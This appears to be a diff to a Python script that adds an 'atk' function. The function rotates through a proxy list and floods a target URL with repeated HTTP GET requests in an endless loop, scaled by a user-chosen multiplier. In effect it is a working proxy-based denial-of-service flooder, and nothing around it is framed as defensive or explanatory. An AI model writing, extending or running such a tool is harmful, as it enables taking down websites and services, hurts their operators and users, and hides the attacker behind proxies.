@@ -34,3 +34,31 @@ def main():
 	print("Proxies Count: "  + "%d" %len(pprr))
 	pow = int(input("Multiplier (1-100):" ))
 	opth()
+	
+def atk():
+	pprr = open(list).readlines()
+	proxy = random.choice(pprr).strip().split(":")
+	s = requests.session()
+	s.proxies = {}
+	s.proxies['http'] = ("http://"+str(proxy[0])+":"+str(proxy[1]))
+	s.proxies['https'] = ("http://"+str(proxy[0])+":"+str(proxy[1]))
+	time.sleep(10)
+	while True:
+		while on:
+			try:
+				s.get(url)
+				print("Req. sent from "  + str(proxy[0])+":"+str(proxy[1]) + " to " + str(url))
+				try:
+					for y in range(pow):
+						s.get(url)
+						print("Req. sent from "  + str(proxy[0])+":"+str(proxy[1]) + " to " + str(url))
+					s.close()
+				except:
+					s.close()
+			except:
+				s.close()
+				print("Proxy Error" )
+
+
+if __name__ == "__main__":
+	main()
